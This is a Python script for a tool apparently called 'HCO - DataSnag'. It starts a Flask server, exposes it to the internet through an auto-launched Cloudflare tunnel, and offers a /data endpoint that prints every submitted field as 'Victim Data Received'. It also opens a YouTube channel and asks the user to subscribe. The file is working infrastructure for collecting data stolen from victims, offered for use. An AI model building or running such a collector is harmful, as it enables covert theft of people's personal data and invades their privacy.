#!/usr/bin/env python3

import os
import time
import subprocess
from flask import Flask, request

app = Flask(__name__)

# ─────────────[ Terminal Banner & YouTube Redirect ]───────────── #
def banner():
    os.system("clear")
    print("""
╔══════════════════════════════════════════╗
║         HCO - DataSnag Tool             ║
╚══════════════════════════════════════════╝
[•] This tool is not free. Redirecting to YouTube...
""")
    time.sleep(8)
    os.system("xdg-open https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya")
    input("[•] Press ENTER after subscribing to continue...\n")

# ─────────────[ Auto Start Cloudflared ]───────────── #
def start_cloudflared():
    try:
        subprocess.Popen(["cloudflared", "tunnel", "--url", "http://localhost:5000"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(5)
    except Exception as e:
        print(f"[×] Failed to start Cloudflared: {e}")

# ─────────────[ Flask Routes ]───────────── #
@app.route('/', methods=['GET'])
def index():
    return "<h2>Welcome to HCO-DataSnag</h2><p>This is a test page. Opened successfully.</p>"

@app.route('/data', methods=['POST'])
def collect_data():
    data = request.get_json()
    print("\n[✓] Victim Data Received:\n")
    for key, value in data.items():
        print(f"{key}: {value}")
    return 'OK'

# ─────────────[ Start Everything ]───────────── #
if __name__ == '__main__':
    banner()
    print("[•] Starting Flask server...")
    start_cloudflared()
    os.system("curl -s http://127.0.0.1:4040/api/tunnels | grep -Eo 'https://[a-z0-9.-]+\\.trycloudflare.com' || echo '[×] Failed to get Cloudflare URL. Make sure tunnel started properly.'")
    app.run(host='0.0.0.0', port=5000)
